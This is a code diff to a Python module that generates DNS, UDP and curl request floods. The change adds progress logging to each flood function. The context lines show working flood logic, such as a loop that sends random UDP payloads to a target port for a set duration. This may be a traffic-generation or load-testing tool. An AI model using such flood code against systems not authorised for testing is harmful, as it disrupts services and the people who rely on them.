@@ -96,12 +96,20 @@ def generate_dns_flood(domains: list, count: int):
         return
 
     logger.info(f"Generating DNS flood: {count} queries...")
+    milestone = max(1, int(count * 0.2))
+    completed = 0
+
     with concurrent.futures.ThreadPoolExecutor(max_workers=20) as exe:
         futures = []
         for _ in range(count):
             dom = random.choice(domains)
             futures.append(exe.submit(_dns_worker, dom))
-        concurrent.futures.wait(futures)
+        
+        for _ in concurrent.futures.as_completed(futures):
+            completed += 1
+            if completed % milestone == 0:
+                pct = int((completed / count) * 100)
+                logger.info(f"DNS Flood progress: {pct}%")
 
 def generate_udp_flood(
     target: str, 
@@ -114,11 +122,13 @@ def generate_udp_flood(
     logger.info(msg)
     
     family = socket.AF_INET6 if ipv6 else socket.AF_INET
+    start_time = time.time()
+    next_pct = 20
     
     try:
         sock = socket.socket(family, socket.SOCK_DGRAM)
         payload = os.urandom(1024)
-        end_time = time.time() + duration
+        end_time = start_time + duration
         
         while time.time() < end_time:
             if _is_stopped(stop_event):
@@ -127,6 +137,11 @@ def generate_udp_flood(
                 sock.sendto(payload, (target, port))
             except Exception:
                 pass
+            
+            elapsed = time.time() - start_time
+            if (elapsed / duration) * 100 >= next_pct:
+                logger.info(f"UDP Flood progress: {next_pct}%")
+                next_pct += 20
             
         sock.close()
     except Exception as e:
@@ -257,6 +272,8 @@ def generate_curl_flood(urls, count, concurrency, stop_event=None):
         return
 
     logger.info(f"Start CURL Flood: {count} reqs, {concurrency} workers.")
+    milestone = max(1, int(count * 0.2))
+    completed = 0
     
     with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as exe:
         futures = []
@@ -270,5 +287,10 @@ def generate_curl_flood(urls, count, concurrency, stop_event=None):
             if _is_stopped(stop_event):
                 exe.shutdown(wait=False, cancel_futures=True)
                 break
+            
+            completed += 1
+            if completed % milestone == 0:
+                pct = int((completed / count) * 100)
+                logger.info(f"CURL Flood progress: {pct}%")
     
     logger.info("CURL Flood finished.")
